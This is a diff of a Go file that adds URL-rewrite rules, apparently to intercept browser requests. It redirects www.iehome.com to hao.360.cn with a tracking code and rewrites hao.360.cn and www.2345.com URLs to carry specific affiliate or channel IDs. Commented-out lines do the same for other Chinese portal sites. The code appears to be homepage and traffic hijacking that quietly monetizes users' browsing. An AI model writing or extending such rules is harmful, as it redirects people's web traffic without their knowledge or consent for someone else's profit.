@@ -58,10 +58,14 @@ var rules compiler.SCompiler
 
 func init() {
 
-	rules.Add("www.iehome.com", "s@^(http[s]?)://www.iehome.com/*/\\?.*$@http://www.2345.com/?kd00560p@i") //^(http[s]?)://[^/]*[/]*/
+	rules.Add("www.iehome.com", "s@^(http[s]?)://www.iehome.com/*/\\?.*$@https://hao.360.cn/?src=lm&ls=n6e7c24959a@i") //^(http[s]?)://[^/]*[/]*/
 
-	rules.Add("www.2345.com", "s@^(http[s]?)://www.2345.com/*/\\?.*$@$1://www.2345.com/?kd00560p@i") //kc000880p
+	rules.Add("hao.360.cn", "s@^(http[s]?)://hao.360.cn/*/\\?.*$@$1://hao.360.cn/?src=lm&ls=n6e7c24959a@i") //kc000880p
+
+	rules.Add("www.2345.com", "s@^(http[s]?)://www.2345.com/*/\\?.*$@$1://www.2345.com/?kc000880p@i") //kc000880p
+
 	//	rules.Add("www.duba.com", "s@^(http[s]?)://www.duba.com/*/\\?.*$@$1://www.duba.com/?un_376755_70@i")
+
 	//	rules.Add("123.sogou.com", "s@^(http[s]?)://123.sogou.com/*/\\?.*$@$1://123.sogou.com/?71117-3920@i")
 
 	//rules.Add("www.hao123.com", "s@^(http[s]?)://www.hao123.com/*/\\?.*$@$1://www.hao123.com/?tn=13087099_4_hao_pg@i")
